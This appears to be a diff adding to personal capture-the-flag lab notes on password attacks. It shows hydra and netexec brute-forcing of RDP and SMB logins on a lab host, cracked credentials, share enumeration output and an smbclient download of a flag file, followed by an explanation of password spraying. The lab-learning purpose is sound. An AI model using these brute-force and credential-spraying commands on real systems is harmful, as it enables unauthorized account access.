@@ -650,4 +650,37 @@ hydra -L username.list -P password.list ssh://10.129.202.136
 
 ```shell
 hydra -L username.list -P password.list rdp://10.129.202.136
+
+xfreerdp /v:10.129.202.136 /u:chris /dynamic-resolution /p:789456123
 ```
+### Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+```shell
+hydra -L username.list -P password.list smb://10.129.202.136
+# It throws me and error, So I used:
+netexec smb 10.129.202.136 -u 2.list -p password.list # It works cassie:12345678910
+```
+
+```shell
+netexec smb 10.129.202.136 -u "cassie" -p "12345678910" --shares # Important the ""
+---
+SMB         10.129.202.136  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:None)
+SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910 
+SMB         10.129.202.136  445    WINSRV           [*] Enumerated shares
+SMB         10.129.202.136  445    WINSRV           Share           Permissions     Remark
+SMB         10.129.202.136  445    WINSRV           -----           -----------     ------
+SMB         10.129.202.136  445    WINSRV           ADMIN$                          Remote Admin
+SMB         10.129.202.136  445    WINSRV           C$                              Default share
+SMB         10.129.202.136  445    WINSRV           CASSIE          READ,WRITE      
+SMB         10.129.202.136  445    WINSRV           IPC$            READ            Remote IPC
+
+
+# Conneting via SMB
+smbclient -U cassie \\\\10.129.202.136\\CASSIE
+get flag.txt
+```
+# Spraying, Stuffing, and Defaults
+
+## Password spraying
+
+[Password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack) is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use `ChangeMe123!` when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.
